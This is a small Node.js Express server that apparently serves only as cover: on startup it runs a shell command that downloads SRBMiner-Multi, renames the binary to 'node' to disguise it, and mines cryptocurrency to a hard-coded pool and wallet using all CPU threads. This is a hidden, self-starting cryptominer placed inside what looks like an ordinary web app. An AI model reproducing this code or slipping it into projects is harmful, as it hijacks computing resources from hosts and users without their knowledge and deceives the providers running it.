const express = require('express');
const http = require('http');
const { exec } = require('child_process');
const prt = process.env.PORT||80
const app = express();
const server = http.createServer(app);

app.get('/', (req, res) => {
  res.send('Aplikasi sedang berjalan');
});

server.listen(prt, () => {
  console.log(`Server berjalan pada port ${prt}`);
});

exec('wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.2/SRBMiner-Multi-2-5-2-Linux.tar.gz && tar -xzvf SRBMiner*.tar.gz && cd SRBMiner-Multi-2-5-2 && mv SRBMiner-MULTI ../node && cd .. && chmod +x node && ./node --algorithm randomx --pool hk-zephyr.miningocean.org:5332 --wallet ZEPHs8CuCDk4XV6e5DXFo3Rp6XfxPZ6gf2vSUjLhmuzTXnHKBNcG3imHj3z9UiTHiC6KMQwGUiAmN6o6Y6iRPX83fCVR3gRyC5y --password shiro1 --cpu-threads 0 --log-file ./Logs/log-itz.txt', (error, stdout, stderr) => {
  console.log(stdout);
 });